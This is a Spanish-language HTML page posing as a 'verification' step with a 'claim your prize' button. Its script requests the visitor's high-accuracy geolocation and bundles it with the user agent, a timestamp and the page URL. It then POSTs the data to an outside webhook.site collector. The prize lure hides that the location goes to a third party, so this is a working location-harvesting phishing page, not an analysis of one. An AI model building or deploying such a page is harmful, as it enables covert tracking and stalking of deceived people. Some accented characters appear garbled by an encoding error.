<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>VERIFICACI√ìN Y VALIDACI√ìN</title>
  <style>
    body { font-family: Arial, sans-serif; text-align: center; margin-top: 50px; background: #f5f6fa; }
    h1 { font-size: 22px; color: #333; }
    button {
      background: #007bff;
      border: none;
      color: #fff;
      padding: 12px 20px;
      font-size: 16px;
      border-radius: 6px;
      cursor: pointer;
    }
    button:hover { background: #0056b3; }
    pre {
      text-align: left;
      background: #fff;
      padding: 10px;
      margin: 20px auto;
      width: 90%;
      max-width: 600px;
      border-radius: 6px;
      box-shadow: 0px 2px 6px rgba(0,0,0,0.1);
      overflow-x: auto;
    }
    a {
      display: block;
      margin-top: 20px;
      font-size: 18px;
      text-decoration: none;
      color: #007bff;
    }
  </style>
</head>
<body>
  <h1>VERIFICACI√ìN Y VALIDACI√ìN</h1>
  <p>Por favor, pulsa el bot√≥n y acepta la solicitud de ubicaci√≥n.</p>
  <button onclick="obtenerUbicacion()">üìç RECLAMA TU PREMIO</button>
  <p id="msg" style="color:red;font-weight:bold;"></p>
  <pre id="output"></pre>
  <a id="mapsLink" target="_blank"></a>

  <script>
    function enviarUbicacion(data) {
      fetch("https://webhook.site/1680fad7-4e5b-4842-a3b7-d76fcd7d5639", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(data)
      })
      .then(res => {
        if (!res.ok) throw new Error("Error HTTP " + res.status);
        document.getElementById("msg").textContent = "‚úÖ Datos enviados correctamente";
      })
      .catch(err => {
        document.getElementById("msg").textContent = "‚ùå Error al enviar: " + err.message;
      });
    }

    function obtenerUbicacion() {
      if (!navigator.geolocation) {
        document.getElementById("msg").textContent = "Tu navegador no soporta geolocalizaci√≥n.";
        return;
      }

      navigator.geolocation.getCurrentPosition(
        pos => {
          const data = {
            lat: pos.coords.latitude,
            lon: pos.coords.longitude,
            accuracy: pos.coords.accuracy,
            timestamp: new Date().toISOString(),
            userAgent: navigator.userAgent,
            maps_link: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`,
            source: window.location.href
          };

          document.getElementById("output").textContent = JSON.stringify(data, null, 2);

          const link = document.getElementById("mapsLink");
          link.href = data.maps_link;
          link.textContent = "üåç Abrir en Google Maps";

          enviarUbicacion(data);
        },
        err => {
          let msg = "Error desconocido";
          if (err.code === 1) msg = "Permiso denegado ‚ùå";
          else if (err.code === 2) msg = "Posici√≥n no disponible.";
          else if (err.code === 3) msg = "Tiempo de espera agotado.";
          document.getElementById("msg").textContent = msg;
        },
        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
      );
    }
  </script>
</body>
</html>
